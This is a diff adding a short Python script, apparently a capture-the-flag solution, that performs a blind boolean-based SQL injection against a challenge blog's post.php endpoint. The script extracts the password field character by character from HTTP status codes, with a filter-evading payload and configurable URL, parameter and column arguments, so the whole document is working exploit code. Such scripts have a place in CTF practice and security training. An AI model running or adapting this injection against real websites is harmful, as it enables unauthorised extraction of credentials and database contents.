@@ -1,0 +1,40 @@
+#!/usr/bin/env python3
+
+from telnetlib import BINARY
+import pwn
+import string
+import requests
+
+leaked_data = ""
+alphabet = string.printable
+url = pwn.args.URL or "https://secureblog.challenge.operation-kernel.fr/v3/post.php"
+param = pwn.args.PARAM or "?id="
+target = pwn.args.TARGET or "2"
+leak = pwn.args.LEAK or "password"
+seek = True
+pwn.log.progress("Can i found it ?")
+while seek:
+    loop = 0
+    for car in alphabet:
+        req = f"({target})and(binary({hex(ord(car))})%A0in(substr({leak},{len(leaked_data)+1},1)))"
+
+        x = requests.get(url + param + req)
+
+        if x.status_code == 200:
+            leaked_data += car
+            print(
+                f"Le caractère {car} est le bon, il est ajouté à data_leak : {leaked_data}",end = '\r')
+            x.close()
+            loop += 1
+            break
+        loop += 1
+        x.close()
+        if loop == len(string.printable):
+            if not leaked_data:
+                pwn.warn("Aucune information n'a été leakée")
+                seek = False
+            else:
+                pwn.success(f"L'information leakée est : {leaked_data}")
+                seek = False
+        else:
+            continue
